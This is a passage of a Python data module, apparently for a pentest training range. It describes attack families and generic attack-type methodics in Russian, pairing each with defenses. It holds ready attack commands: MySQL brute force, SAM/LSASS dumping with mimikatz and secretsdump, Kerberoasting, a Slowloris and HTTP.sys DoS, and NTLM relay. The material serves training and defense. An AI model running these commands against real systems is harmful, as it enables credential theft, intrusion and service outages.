                        "но реализуемость зависит от стойкости учётных данных — нужен подбор словарём."),
    attack_methodic={
        "summary": "Сетевой подбор логина/пароля MySQL по словарю с последующим входом и оценкой привилегий.",
        "prerequisites": ["Доступ к 3306/TCP.", "MySQL принимает удалённые подключения.", "Словари логинов/паролей."],
        "phases": [
            phase("Разведка", "Подтвердить MySQL и версию", [
                step("Идентификация",
                     "nmap -p3306 -sV --script mysql-info <target>",
                     "Версия MySQL и параметры handshake",
                     "Версия и метод аутентификации задают применимость словаря/инструмента."),
            ]),
            phase("Подбор", "Найти валидные учётные данные", [
                step("Брутфорс по словарю",
                     "hydra -L users.txt -P passwords.txt mysql://<target>:3306",
                     "Найдена пара логин:пароль",
                     "Начинать с типовых (root/'' , root:root) — учебные стенды часто их содержат."),
                step("Альтернатива",
                     "nmap -p3306 --script mysql-brute --script-args userdb=users.txt,passdb=pass.txt <target>",
                     "Valid credentials в выводе NSE",
                     "Полезно, когда hydra недоступен."),
            ]),
            phase("Пост-эксплуатация", "Войти и оценить доступ", [
                step("Подключиться и проверить права",
                     "mysql -h <target> -u <user> -p ; SHOW GRANTS; SELECT current_user();",
                     "Приглашение MySQL, видны привилегии",
                     "FILE/SUPER-привилегии могут вести к чтению файлов/RCE через UDF."),
            ]),
        ],
        "tools": [tool("Hydra", "apt install hydra", "Сетевой брутфорс"),
                  tool("Nmap NSE", "apt install nmap", "mysql-info/mysql-brute"),
                  tool("mysql client", "apt install default-mysql-client", "Вход и проверка прав")],
        "troubleshooting": [
            "Блокировка по числу попыток -> снизить скорость (-t), сделать паузы.",
            "Хост не принимает удалённые подключения (bind 127.0.0.1) -> брутфорс невозможен снаружи.",
        ],
        "cleanup": ["Не оставлять созданных тестовых пользователей/таблиц."],
    },
    defense_methodic={
        "summary": "Сильные пароли, ограничение источников, бинд на нужный интерфейс, мониторинг неудачных входов.",
        "detection": ["Всплеск ошибок аутентификации MySQL (Access denied) от одного IP."],
        "hardening": [
            "bind-address на доверенный интерфейс; firewall на 3306; запрет root удалённо.",
            "Политика паролей; плагины ограничения попыток (connection_control).",
        ],
        "patch": "Конфигурация; обновлять MySQL до поддерживаемой версии.",
        "validation": ["3306 недоступен извне", "hydra исчерпывает словарь без успеха"],
    },
)

family(
    "mysql_noauth",
    title="MySQL No Auth / Weak Auth (3306) — доступ без/со слабой аутентификацией",
    aliases=["mysql no auth", "mysql info", "mysql weak auth"],
    cves=[],
    attack_types=["authentication_bypass", "misconfiguration"],
    ports=[3306],
    execution=execution("none", False, False, "native",
                        "Эксплуатируется ошибка конфигурации: анонимный/беспарольный доступ к СУБД.",
                        outcome_uncertain="Нужно подтвердить, что беспарольный/анонимный доступ "
                        "действительно включён — по открытому порту это не гарантировано."),
    attack_methodic={
        "summary": "Использование небезопасной конфигурации MySQL: анонимные/беспарольные учётки, открытый доступ.",
        "prerequisites": ["Доступ к 3306.", "Наличие беспарольной/анонимной учётной записи."],
        "phases": [
            phase("Проверка", "Попытаться войти без пароля", [
                step("Вход без пароля",
                     "mysql -h <target> -u root --skip-password ; mysql -h <target> -u '' ",
                     "Получено приглашение MySQL без ввода пароля",
                     "Демонстрирует отсутствие аутентификации/анонимный доступ."),
                step("Оценить данные и привилегии",
                     "SHOW DATABASES; SELECT current_user(); SHOW GRANTS;",
                     "Список БД и прав",
                     "Определяет масштаб доступа (чтение/запись/файловые операции)."),
            ]),
        ],
        "tools": [tool("mysql client", "apt install default-mysql-client", "Проверка доступа")],
        "troubleshooting": ["Пароль всё же требуется -> переходить к брутфорсу (см. mysql_bruteforce)."],
        "cleanup": ["Закрыть сессии; ничего не менять в учебной БД."],
    },
    defense_methodic={
        "summary": "Удалить анонимные/беспарольные учётки, mysql_secure_installation, ограничить доступ.",
        "detection": ["Входы под анонимной учёткой/без пароля в логах MySQL."],
        "hardening": ["mysql_secure_installation; DROP анонимных пользователей; пароли для всех учёток."],
        "patch": "Конфигурация.",
        "validation": ["Беспарольный вход отклоняется", "Нет анонимных пользователей в mysql.user"],
    },
)

family(
    "sam_extraction",
    title="SAM / LSASS Extraction — извлечение локальных учётных данных",
    aliases=["sam database extraction", "sam extraction", "secretsdump", "lsass", "hashdump"],
    cves=[],
    attack_types=["credential_theft"],
    ports=[],
    execution=execution("admin", False, True, "tooling",
                        "Локальное действие на хосте: нужны права администратора/SYSTEM, сетевого порта нет."),
    attack_methodic={
        "summary": (
            "Извлечение хэшей из реестра SAM/SYSTEM и секретов LSA/LSASS после получения админ-прав. "
            "Это пост-эксплуатация: даёт материал для pass-the-hash и горизонтального перемещения."
        ),
        "prerequisites": [
            "Уже получены права локального администратора/SYSTEM на хосте (предшествующий вектор).",
            "Локальный доступ или админ-сессия (PsExec/WMI/Meterpreter).",
        ],
        "phases": [
            phase("Извлечение", "Снять хэши и секреты", [
                step("Дамп SAM/SYSTEM локально",
                     "reg save HKLM\\SAM sam.hiv & reg save HKLM\\SYSTEM sys.hiv ; "
                     "secretsdump.py -sam sam.hiv -system sys.hiv LOCAL",
                     "NTLM-хэши локальных учёток",
                     "Кусты SAM+SYSTEM достаточно для офлайн-извлечения локальных хэшей."),
                step("Удалённо с админ-учёткой",
                     "secretsdump.py <domain>/<admin>:<pass>@<target>",
                     "SAM + кэш + LSA secrets",
                     "Через DCE/RPC, требует админ-прав на цели."),
                step("Дамп LSASS (доменные сессии)",
                     "procdump -ma lsass.exe lsass.dmp ; mimikatz: sekurlsa::minidump lsass.dmp / sekurlsa::logonpasswords",
                     "Учётные данные активных сессий",
                     "Даёт пароли/билеты доменных пользователей, вошедших на хост."),
            ]),
        ],
        "tools": [
            tool("Impacket (secretsdump)", "pip install impacket", "Извлечение SAM/LSA"),
            tool("Mimikatz", "github gentilkiwi/mimikatz", "Дамп LSASS/секретов"),
            tool("Sysinternals ProcDump", "Microsoft Sysinternals", "Снятие дампа LSASS"),
        ],
        "troubleshooting": [
            "Нет админ-прав -> сначала повышение привилегий (внешний вектор/LPE).",
            "LSASS защищён (RunAsPPL/Credential Guard) -> прямой дамп блокируется.",
        ],
        "cleanup": ["Удалить .hiv/.dmp файлы; завершить mimikatz-сессии."],
    },
    defense_methodic={
        "summary": "Credential Guard, RunAsPPL для LSASS, LAPS, минимизация админ-прав, мониторинг доступа к LSASS.",
        "detection": ["Доступ к lsass.exe нестандартными процессами (Sysmon Event 10); reg save SAM/SYSTEM."],
        "hardening": [
            "Включить LSA Protection (RunAsPPL) и Credential Guard.",
            "LAPS для уникальных локальных админ-паролей; не входить доменным админом на рядовые хосты.",
        ],
        "patch": "Конфигурация + актуальные обновления ОС.",
        "validation": ["Sysmon фиксирует/блокирует доступ к LSASS", "RunAsPPL включён (реестр RunAsPPL=1)"],
    },
)

family(
    "kerberoasting",
    title="Kerberoasting (88/Kerberos) — добыча и взлом сервисных билетов",
    aliases=["kerberoasting", "kerberoast", "spn roasting"],
    cves=[],
    attack_types=["credential_theft"],
    ports=[88, 464],
    execution=execution("user", False, False, "tooling",
                        "Требует ЛЮБОЙ валидной доменной учётки; извне без доменных кредов неприменимо.",
                        outcome_uncertain="Успех зависит от наличия учёток со SPN и стойкости их "
                        "паролей; нужны валидные доменные креды для запроса билетов."),
    attack_methodic={
        "summary": (
            "Любой доменный пользователь может запросить TGS-билеты для учёток со SPN. Билет зашифрован "
            "NTLM-хэшем сервисной учётки -> офлайн-перебор пароля сервисной учётной записи."
        ),
        "prerequisites": [
            "Валидная доменная учётная запись (даже непривилегированная).",
            "Сетевой доступ к контроллеру домена (Kerberos 88).",
            "В домене есть учётки со SPN и слабыми паролями.",
        ],
        "phases": [
            phase("Разведка", "Найти учётки со SPN", [
                step("Перечислить SPN",
                     "GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <DC>",
                     "Список учёток со SPN",
                     "Только учётки со SPN можно «зароастить»."),
            ]),
            phase("Добыча+взлом", "Получить и сломать билеты", [
                step("Запросить TGS",
                     "GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <DC> -request -outputfile hashes.kerb",
                     "Хэши TGS в формате $krb5tgs$",
                     "Билеты выгружаются для офлайн-перебора (онлайн-нагрузки на DC нет)."),
                step("Перебор пароля",
                     "hashcat -m 13100 hashes.kerb wordlist.txt",
                     "Восстановлен пароль сервисной учётки",
                     "Сервисные учётки часто имеют старые/слабые пароли и высокие привилегии."),
            ]),
        ],
        "tools": [
            tool("Impacket (GetUserSPNs)", "pip install impacket", "Запрос TGS по SPN"),
            tool("Hashcat", "apt install hashcat", "Офлайн-перебор $krb5tgs$"),
            tool("Rubeus", "github GhostPack/Rubeus", "Kerberoasting из-под Windows"),
        ],
        "troubleshooting": [
            "Нет доменных кредов -> Kerberoasting неприменим (нужен хотя бы один аккаунт).",
            "Учётки со SPN отсутствуют -> роастить нечего.",
        ],
        "cleanup": ["Удалить выгруженные билеты/хэши после учений."],
    },
    defense_methodic={
        "summary": "Длинные случайные пароли (gMSA) для сервисных учёток, AES вместо RC4, мониторинг массовых TGS.",
        "detection": ["Event 4769 с RC4 (0x17) и массовым запросом TGS от одной учётки."],
        "hardening": ["Перейти на gMSA (управляемые сервисные учётки); требовать AES; убрать лишние SPN."],
        "patch": "Конфигурация AD.",
        "validation": ["GetUserSPNs не находит слабых учёток", "Event 4769 без RC4 для сервисных SPN"],
    },
)

family(
    "dos_generic",
    title="Denial of Service — нарушение доступности сервиса",
    aliases=["denial of service", "dos", "slowloris", "http.sys", "cve-2021-31166"],
    cves=["CVE-2021-31166"],
    attack_types=["denial_of_service"],
    ports=[80, 443, 8443],
    execution=execution("none", False, False, "tooling",
                        "Нарушение доступности; в учебной среде проводить осторожно и только по согласованию."),
    attack_methodic={
        "summary": (
            "Исчерпание ресурсов сервиса (соединения/память/CPU) либо эксплуатация уязвимости отказа "
            "(например, CVE-2021-31166 в HTTP.sys) -> сервис перестаёт отвечать."
        ),
        "prerequisites": ["Доступ к целевому сетевому сервису.", "Согласование (DoS разрушителен)."],
        "phases": [
            phase("Подготовка", "Зафиксировать базовую доступность", [
                step("Базовая проверка",
                     "curl -m 5 -s -o /dev/null -w '%{http_code}\\n' http://<target>:<port>/",
                     "Сервис отвечает (200/301/...)",
                     "Нужна точка отсчёта, чтобы доказать факт отказа."),
            ]),
            phase("Нагрузка", "Вызвать отказ", [
                step("Удержание соединений (Slowloris)",
                     "slowhttptest -c 1000 -H -u http://<target>:<port>",
                     "Рост удерживаемых соединений, рост времени ответа",
                     "Демонстрирует исчерпание пула соединений веб-сервера."),
                step("Эксплойт отказа (если применим)",
                     "python3 cve-2021-31166.py <target>   # HTTP.sys",
                     "BSOD/зависание стека HTTP.sys",
                     "Применять только на согласованном стенде — приводит к падению цели."),
            ]),
            phase("Фиксация", "Подтвердить отказ", [
                step("Повторная проверка",
                     "curl -m 5 http://<target>:<port>/",
                     "Таймаут/нет ответа",
                     "Сравнение с базовой проверкой доказывает DoS."),
            ]),
        ],
        "tools": [tool("slowhttptest", "apt install slowhttptest", "Slowloris/Slow POST"),
                  tool("curl", "apt install curl", "Замер доступности")],
        "troubleshooting": ["Стоит rate-limiting/WAF -> отказ не достигается; зафиксировать как защиту."],
        "cleanup": ["Прекратить нагрузку; убедиться, что сервис восстановился."],
    },
    defense_methodic={
        "summary": "Rate-limiting, таймауты, reverse-proxy/WAF, патчи стека (HTTP.sys), мониторинг доступности.",
        "detection": ["Резкий рост числа соединений/времени ответа; алерты доступности."],
        "hardening": ["Ограничить число соединений с одного IP; таймауты заголовков; CDN/WAF; патч HTTP.sys."],
        "patch": "CVE-2021-31166 (май 2021) для HTTP.sys.",
        "validation": ["Под нагрузкой сервис сохраняет отклик", "WAF/таймауты срабатывают"],
    },
)

family(
    "recon",
    title="Footprinting / Reconnaissance / Large Attack Surface — разведка поверхности",
    aliases=["footprinting", "reconnaissance", "large attack surface", "wappalyzer",
             "technology detection", "basic auth detection", "missing security headers",
             "node_env", "labview", "service locator", "vmware authentication daemon detection",
             "subresource integrity", "eventlistener", "dom event", "banner grabbing", "excavation"],
    cves=[],
    attack_types=["reconnaissance", "information_disclosure", "misconfiguration"],
    ports=[],
    execution=execution("none", False, False, "tooling",
                        "Пассивная/активная разведка; повышает реализуемость прочих атак, сама по себе низкого риска."),
    attack_methodic={
        "summary": (
            "Сбор сведений о цели: открытые порты, версии сервисов, технологии веб-стека, заголовки "
            "безопасности, точки аутентификации. Сужает поверхность и приоритизирует последующие атаки."
        ),
        "prerequisites": ["Сетевой доступ к цели."],
        "phases": [
            phase("Сканирование", "Снять карту сервисов и технологий", [
                step("Полное сканирование портов и версий",
                     "nmap -p- -sV -sC <target>",
                     "Список портов, версий, базовые NSE-находки",
                     "Версии сервисов -> сопоставление с известными CVE."),
                step("Веб-технологии и заголовки",
                     "nuclei -u http://<target>:<port> -t http/technologies,http/misconfiguration",
                     "Технологии (Wappalyzer), отсутствующие заголовки, basic-auth точки",
                     "Отсутствие security-заголовков и dev-режимы (NODE_ENV) указывают на слабую конфигурацию."),
                step("Захват баннеров",
                     "nc -nv <target> <port> ; nmap --script banner -p<port> <target>",
                     "Баннер с продуктом/версией",
                     "Баннеры уточняют продукт (например, vmware-authd на 902)."),
            ]),
        ],
        "tools": [tool("Nmap", "apt install nmap", "Порты/версии/NSE"),
                  tool("Nuclei", "go install projectdiscovery/nuclei", "Шаблонные веб-проверки"),
                  tool("netcat", "apt install netcat", "Захват баннеров")],
        "troubleshooting": ["Фильтрация портов -> использовать медленные/скрытные режимы; разведка остаётся неполной."],
        "cleanup": ["Разведка не меняет цель; сохранить артефакты для приоритизации."],
    },
    defense_methodic={
        "summary": "Минимизировать поверхность: закрыть лишние порты, скрыть версии, добавить security-заголовки, убрать dev-режимы.",
        "detection": ["Сканирование портов/шаблонные nuclei-запросы (паттерн в логах WAF/IDS)."],
        "hardening": [
            "Закрыть неиспользуемые порты; reverse-proxy скрывает баннеры/версии.",
            "Security-заголовки (HSTS, X-Frame-Options, CSP); отключить NODE_ENV=development в проде.",
        ],
        "patch": "Конфигурация и сегментация.",
        "validation": ["nmap снаружи видит минимум портов", "nuclei не находит missing-headers/dev-режимов"],
    },
)

# --------------------------------------------------------------------------- #
#  ОБОБЩЁННЫЕ МЕТОДИЧКИ ПО ТИПУ АТАКИ
#  Нужны, чтобы на ЛЮБОМ стенде (чужие сканеры, другие сервисы/CVE) описание
#  было корректным: если конкретное семейство не найдено, показывается честная
#  универсальная методичка для данного КЛАССА атаки, а не чужая под другой
#  продукт. Команды здесь продукто-независимые: первый шаг — определить продукт
#  и версию, дальше эксплойт/словарь подбираются строго под них.
# --------------------------------------------------------------------------- #

TYPE_METHODICS: dict[str, dict] = {}


def type_methodic(attack_type: str, title: str, execution: dict,
                  attack_methodic: dict, defense_methodic: dict) -> None:
    TYPE_METHODICS[attack_type] = {
        "title": title,
        "execution": execution,
        "attack_methodic": attack_methodic,
        "defense_methodic": defense_methodic,
        "generic": True,
    }


type_methodic(
    "remote_code_execution",
    "Удалённое выполнение кода (обобщённо) — определить продукт и подобрать эксплойт",
    execution("none", False, False, "tooling",
              "Конкретный эксплойт зависит от продукта и версии — сначала их определяем."),
    {
        "summary": "Эксплуатация уязвимости, дающей выполнение кода на сетевом сервисе. "
                   "Конкретный путь зависит от продукта и версии — методичка универсальна: "
                   "идентификация → подбор эксплойта под продукт → запуск → закрепление.",
        "prerequisites": ["Сетевой доступ к сервису.", "Публичный эксплойт/PoC под конкретный продукт и версию."],
        "phases": [
            phase("Разведка", "Точно определить продукт и версию", [
                step("Снять продукт и версию сервиса",
                     "nmap -sV -p<port> <target> ; nuclei -u <target>:<port>",
                     "Известны продукт и версия на порту",
                     "Эксплойт подбирается СТРОГО под продукт и версию — без этого выбор наугад."),
            ]),
            phase("Поиск эксплойта", "Найти подходящий PoC/модуль", [
                step("Поиск по продукту и версии",
                     "searchsploit <продукт> <версия> ; msfconsole -q -x 'search <продукт>'",
                     "Найден PoC/Metasploit-модуль под цель",
                     "Берём эксплойт именно под выявленный продукт, а не похожий."),
            ]),
            phase("Эксплуатация", "Выполнить код и закрепиться", [
                step("Запустить эксплойт по его инструкции",
                     "<запуск выбранного PoC/модуля против <target>:<port>>",
                     "Выполнение кода / сессия на цели",
                     "Параметры (payload/target) задаются по документации конкретного эксплойта."),
                step("Подтвердить контекст",
                     "whoami / id ; hostname",
                     "Подтверждён уровень доступа",
                     "Фиксируем факт RCE для отчёта."),
            ]),
        ],
        "tools": [tool("Nmap", "apt install nmap", "Продукт/версия"),
                  tool("searchsploit / Metasploit", "apt install exploitdb metasploit-framework", "Подбор эксплойта"),
                  tool("Nuclei", "go install projectdiscovery/nuclei", "Шаблонные проверки уязвимостей")],
        "troubleshooting": ["Эксплойта под версию нет -> проверить смежные версии/форки PoC или признать невозможным.",
                            "Антивирус/WAF блокирует -> сменить payload/энкодер (в рамках авторизации)."],
        "cleanup": ["Закрыть сессии, удалить загруженные артефакты."],
    },
    {
        "summary": "Своевременные обновления, минимизация сервисов, сегментация, WAF и мониторинг эксплуатации.",
        "detection": ["IDS/IPS и WAF на сигнатуры эксплойтов; аномальные дочерние процессы сервиса; новые файлы в его каталогах."],
        "hardening": ["Обновлять ПО до поддерживаемых версий; убрать неиспользуемые сервисы; сегментировать сеть; принцип наименьших привилегий для сервисных учёток."],
        "patch": "Установить обновления производителя, закрывающие конкретную CVE.",
        "validation": ["Повторный скан версии показывает пропатченный билд; эксплойт более не срабатывает на стенде."],
    },
)

type_methodic(
    "brute_force",
    "Подбор учётных данных (обобщённо) — для любого сервиса с аутентификацией",
    execution("none", False, False, "tooling",
              "Универсальный сетевой подбор; hydra/medusa/ncrack поддерживают ssh/ftp/rdp/smb/http/sql и др.",
              outcome_uncertain="Пароль заранее неизвестен: достижимость и работу сервиса подтвердить можем, "
              "но успех зависит от стойкости учётных данных — нужен подбор."),
    {
        "summary": "Сетевой подбор логина/пароля для сервиса с аутентификацией. Успех зависит от "
                   "слабости паролей и отсутствия блокировок. Метод универсален для любого протокола.",
        "prerequisites": ["Доступ к сервису с аутентификацией.", "Словари логинов/паролей."],
        "phases": [
            phase("Разведка", "Определить сервис и протокол", [
                step("Идентификация сервиса",
                     "nmap -sV -p<port> <target>",
                     "Известен протокол (ssh/ftp/rdp/smb/http/sql/...)",
                     "От протокола зависит модуль hydra/medusa и формат строки."),
            ]),
            phase("Подбор", "Найти валидные учётные данные", [
                step("Подбор по словарю",
                     "hydra -L users.txt -P passwords.txt <proto>://<target>:<port>",
                     "Найдена пара логин:пароль",
                     "<proto> = ssh/ftp/rdp/smb/http-get/mysql/postgres и т.д. Начать с типовых/дефолтных."),
                step("Вход под найденными данными",
                     "<клиент сервиса> -u <user> -p <target>:<port>",
                     "Успешная аутентификация",
                     "Подтверждаем доступ и оцениваем привилегии."),
            ]),
        ],
        "tools": [tool("Hydra", "apt install hydra", "Подбор для множества протоколов"),
                  tool("Medusa/Ncrack", "apt install medusa ncrack", "Альтернативные брутфорсеры"),
                  tool("Nmap", "apt install nmap", "Идентификация сервиса")],
        "troubleshooting": ["Блокировка по попыткам -> снизить скорость (-t), паузы.",
                            "Сервис слушает только локально -> удалённый подбор невозможен."],
        "cleanup": ["Не оставлять тестовых учёток/сессий."],
    },
    {
        "summary": "Сильные пароли, лимиты/блокировки попыток, MFA, ограничение источников, мониторинг неудач.",
        "detection": ["Всплеск ошибок аутентификации с одного источника; алерты на множественные неудачи."],
        "hardening": ["Политика паролей и MFA; lockout/throttling; firewall на управляющие порты; не публиковать наружу."],
        "patch": "Конфигурация; обновление сервиса.",
        "validation": ["Брутфорс исчерпывает словарь без успеха; срабатывает блокировка."],
    },
)

type_methodic(
    "authentication_bypass",
    "Обход/слабость аутентификации (обобщённо) — анонимный или дефолтный доступ",
    execution("none", False, False, "native",
              "Эксплуатация ошибок конфигурации: анонимный доступ, дефолтные/пустые учётные данные.",
              outcome_uncertain="Нужно подтвердить, что анонимный/дефолтный доступ действительно включён — "
              "по открытому порту это не гарантировано."),
    {
        "summary": "Доступ к сервису без корректной аутентификации: анонимный режим, дефолтные/пустые пароли, "
                   "логический обход проверки. Универсально для любого сервиса.",
        "prerequisites": ["Доступ к сервису.", "Сервис допускает анонимный/дефолтный доступ или имеет дефект проверки."],
        "phases": [
            phase("Проверка", "Попробовать доступ без/с дефолтными данными", [
                step("Анонимный и дефолтный доступ",
                     "<клиент сервиса> подключение без пароля ; затем типовые admin/admin, root/'' и т.п.",
                     "Получен доступ без корректной аутентификации",
                     "Демонстрирует отсутствие/слабость аутентификации."),
                step("Оценить полученный доступ",
                     "<команды сервиса: список данных/прав>",
                     "Понятен объём доступа",
                     "Определяет масштаб (чтение/запись/админ-функции)."),
            ]),
        ],
        "tools": [tool("Клиент целевого сервиса", "—", "Проверка доступа"),
                  tool("Nuclei", "go install projectdiscovery/nuclei", "Шаблоны default-login/exposure")],
        "troubleshooting": ["Аутентификация всё же требуется -> перейти к подбору (brute_force)."],
        "cleanup": ["Закрыть сессии; ничего не менять в учебных данных."],
    },
    {
        "summary": "Убрать анонимный/дефолтный доступ, обязательная аутентификация, harden конфигурации.",
        "detection": ["Входы под анонимными/дефолтными учётками в логах сервиса."],
        "hardening": ["Сменить дефолтные пароли; отключить анонимный доступ; обязательная аутентификация и авторизация."],
        "patch": "Конфигурация; обновление при логических дефектах.",
        "validation": ["Анонимный/дефолтный вход отклоняется."],
    },
)

type_methodic(
    "information_disclosure",
    "Раскрытие информации (обобщённо) — перечисление сервиса",
    execution("none", False, False, "native",
              "Сбор сведений, которые сервис отдаёт без должного ограничения доступа."),
    {
        "summary": "Получение сведений (версии, ресурсы, учётки, конфигурация), которые сервис отдаёт "
                   "без должного контроля доступа. Используется для подготовки последующих атак.",
        "prerequisites": ["Доступ к сервису."],
        "phases": [
            phase("Перечисление", "Снять доступные сведения", [
                step("Базовое перечисление",
                     "nmap -sV -sC -p<port> <target> ; nuclei -u <target>:<port>",
                     "Версии, баннеры, открытые ресурсы и мисконфиги",
                     "Раскрытые данные приоритизируют дальнейшие атаки."),
            ]),
        ],
        "tools": [tool("Nmap (NSE)", "apt install nmap", "Перечисление/скрипты"),
                  tool("Nuclei", "go install projectdiscovery/nuclei", "Exposure-шаблоны")],
        "troubleshooting": ["Доступ ограничен/требует аутентификации -> нужны валидные учётки."],
        "cleanup": ["Разведка без изменений; сохранить вывод."],
    },
    {
        "summary": "Ограничить доступ к сервису, скрыть версии/баннеры, убрать лишние раскрытия.",
        "detection": ["Множественные перечисляющие запросы/сканы от одного источника."],
        "hardening": ["Ограничение доступа (firewall/auth); reverse-proxy скрывает версии; убрать отладочные эндпоинты."],
        "patch": "Конфигурация.",
        "validation": ["Снаружи раскрывается минимум сведений."],
    },
)

type_methodic(
    "reconnaissance",
    "Разведка (обобщённо) — карта сервисов и поверхности",
    execution("none", False, False, "tooling",
              "Сбор поверхности; сама по себе низкий риск, повышает реализуемость прочих атак."),
    {
        "summary": "Сбор сведений о цели: порты, версии, технологии, точки входа. Сужает поверхность и "
                   "приоритизирует атаки.",
        "prerequisites": ["Сетевой доступ к цели."],
        "phases": [
            phase("Сканирование", "Снять карту сервисов", [
                step("Порты, версии, технологии",
                     "nmap -p- -sV -sC <target> ; nuclei -u <target> -t http/technologies,http/misconfiguration",
                     "Список сервисов, версий, технологий, мисконфигов",
                     "Версии сопоставляются с известными CVE для следующих шагов."),
            ]),
        ],
        "tools": [tool("Nmap", "apt install nmap", "Порты/версии"),
                  tool("Nuclei", "go install projectdiscovery/nuclei", "Технологии/мисконфиги")],
        "troubleshooting": ["Фильтрация портов -> скрытные/медленные режимы; разведка остаётся неполной."],
        "cleanup": ["Сохранить артефакты для приоритизации."],
    },
    {
        "summary": "Минимизировать поверхность: закрыть лишние порты, скрыть версии, сегментировать.",
        "detection": ["Сканирование портов/шаблонные запросы в логах IDS/WAF."],
        "hardening": ["Закрыть неиспользуемые порты; reverse-proxy; сегментация."],
        "patch": "Конфигурация и сегментация.",
        "validation": ["Снаружи видно минимум сервисов."],
    },
)

type_methodic(
    "credential_theft",
    "Кража учётных данных (обобщённо) — извлечение секретов после доступа",
    execution("admin", False, True, "tooling",
              "Как правило пост-эксплуатация: нужны повышенные права/доступ к хосту или хранилищу секретов."),
    {
        "summary": "Извлечение учётных данных из памяти, хранилищ, конфигов после получения доступа. "
                   "Материал для горизонтального перемещения.",
        "prerequisites": ["Уже получен достаточный доступ (админ/локальный или доступ к хранилищу секретов)."],
        "phases": [
            phase("Извлечение", "Снять секреты", [
                step("Дамп секретов ОС/сервиса",
                     "Windows: secretsdump/mimikatz ; Linux: чтение конфигов/ключей, /etc/shadow, history",
                     "Хэши/пароли/ключи/токены",
                     "Источник зависит от ОС и сервиса; нужны соответствующие права."),
            ]),
        ],
        "tools": [tool("Impacket (secretsdump)", "pip install impacket", "Извлечение секретов Windows"),
                  tool("Mimikatz", "github gentilkiwi/mimikatz", "Дамп LSASS/секретов"),
                  tool("Hashcat/John", "apt install hashcat john", "Офлайн-перебор хэшей")],
        "troubleshooting": ["Нет нужных прав -> сначала повышение привилегий.",
                            "Защита памяти/секретов (Credential Guard/vault) -> прямой дамп блокируется."],
        "cleanup": ["Удалить дампы; завершить инструменты."],
    },
    {
        "summary": "Защита секретов (хранилища/менеджеры), защита памяти, минимизация админ-доступа, мониторинг доступа к секретам.",
        "detection": ["Доступ к хранилищам секретов/памяти процессов нестандартными процессами; чтение чувствительных файлов."],
        "hardening": ["Менеджеры секретов/vault; защита памяти (LSA Protection/Credential Guard); ротация; least privilege."],
        "patch": "Конфигурация + обновления ОС.",
        "validation": ["Попытки дампа фиксируются/блокируются."],
    },
)

type_methodic(
    "relay_attack",
    "Ретрансляция/MITM аутентификации (обобщённо) — нужна позиция в сегменте",
    execution("user", True, False, "weaponized",
              "Требует позиции в L2-сегменте жертвы — извне периметра неприменимо.",
              outcome_uncertain="Нужно подтвердить отключённую защиту аутентификации (подпись/EPA) и "
              "наличие жертвы, инициирующей аутентификацию в сегменте."),
    {
        "summary": "Перехват и ретрансляция аутентификации (или MITM) в локальном сегменте: доступ от имени жертвы.",
        "prerequisites": ["Позиция в одном сегменте с жертвами.", "Слабая защита аутентификации (нет подписи/шифрования/EPA)."],
        "phases": [
            phase("Перехват+ретрансляция", "Получить доступ от имени жертвы", [
                step("Перехват/отравление и ретрансляция",
                     "responder -I <iface> ; ntlmrelayx.py -t <target> -smb2support ; (или bettercap для MITM)",
                     "Сессия/доступ от имени жертвы",
                     "Инструмент зависит от протокола; нужна реальная L2-позиция."),
            ]),
        ],
        "tools": [tool("Responder", "apt install responder", "Отравление имён"),
                  tool("Impacket (ntlmrelayx)", "pip install impacket", "Ретрансляция"),
                  tool("bettercap", "apt install bettercap", "MITM канального уровня")],
        "troubleshooting": ["Везде подпись/шифрование/EPA -> ретрансляция невозможна.",
                            "Нет L2-доступа (за маршрутизатором) -> вектор закрыт."],
        "cleanup": ["Остановить перехват/отравление."],
    },
    {
        "summary": "Обязательная подпись/шифрование, EPA, отключить устаревшие протоколы разрешения имён, сегментация.",
        "detection": ["Множественные ответы на широковещательные запросы имён; вход одной учётки на множестве хостов."],
        "hardening": ["Включить подпись/шифрование сессий; EPA; отключить LLMNR/NBT-NS и аналоги; 802.1X."],
        "patch": "Конфигурация + обновления.",
        "validation": ["Ретрансляция/MITM в сегменте не проходит."],
    },
)

# MITM = тот же класс, что и relay
TYPE_METHODICS["man_in_the_middle"] = dict(TYPE_METHODICS["relay_attack"])

type_methodic(
    "denial_of_service",
    "Отказ в обслуживании (обобщённо) — нарушение доступности",
    execution("none", False, False, "tooling",
              "Разрушительно: проводить только по согласованию на изолированном стенде."),
    {
        "summary": "Исчерпание ресурсов или эксплуатация дефекта отказа -> сервис перестаёт отвечать.",
        "prerequisites": ["Доступ к сервису.", "Согласование (DoS разрушителен)."],
        "phases": [
            phase("Подготовка", "Зафиксировать базовую доступность", [
                step("Базовая проверка",
                     "curl -m 5 -o /dev/null -w '%{http_code}\\n' http://<target>:<port>/ (или проверка TCP-отклика)",
                     "Сервис отвечает",
                     "Нужна точка отсчёта для доказательства отказа."),
            ]),
            phase("Нагрузка и фиксация", "Вызвать и подтвердить отказ", [
                step("Нагрузка/эксплойт отказа",
                     "slowhttptest -c 1000 -H -u http://<target>:<port> (или специфичный PoC отказа)",
                     "Рост времени ответа, затем таймаут",
                     "Метод зависит от сервиса; применять только на согласованном стенде."),
            ]),
        ],
        "tools": [tool("slowhttptest", "apt install slowhttptest", "Slowloris/Slow POST"),
                  tool("curl", "apt install curl", "Замер доступности")],
        "troubleshooting": ["Стоит rate-limit/WAF -> отказ не достигается; фиксируем как защиту."],
        "cleanup": ["Прекратить нагрузку; убедиться в восстановлении сервиса."],
    },
    {
        "summary": "Rate-limiting, таймауты, reverse-proxy/WAF/anti-DDoS, патчи стека, мониторинг доступности.",
        "detection": ["Резкий рост соединений/времени ответа; алерты доступности."],
        "hardening": ["Лимиты соединений; таймауты; CDN/WAF; патчи уязвимостей отказа."],
        "patch": "Обновления, закрывающие конкретные DoS-уязвимости.",
        "validation": ["Под нагрузкой сервис сохраняет отклик."],
    },
)

type_methodic(
    "misconfiguration",
    "Небезопасная конфигурация (обобщённо)",
    execution("none", False, False, "tooling",
              "Использование ошибок настройки для доступа/расширения."),
    {
        "summary": "Эксплуатация ошибок настройки: лишние права, открытые интерфейсы, дефолтные параметры, отладочные режимы.",
        "prerequisites": ["Доступ к сервису с небезопасной конфигурацией."],
        "phases": [
            phase("Выявление и использование", "Найти и применить мисконфиг", [
                step("Поиск мисконфигов",
                     "nuclei -u <target>:<port> -t http/misconfiguration ; ручная проверка дефолтов/отладки",
                     "Найдены небезопасные настройки",
                     "Дефолтные креды, открытые админки, debug-режимы, избыточные права."),
                step("Использование",
                     "<доступ через выявленный мисконфиг>",
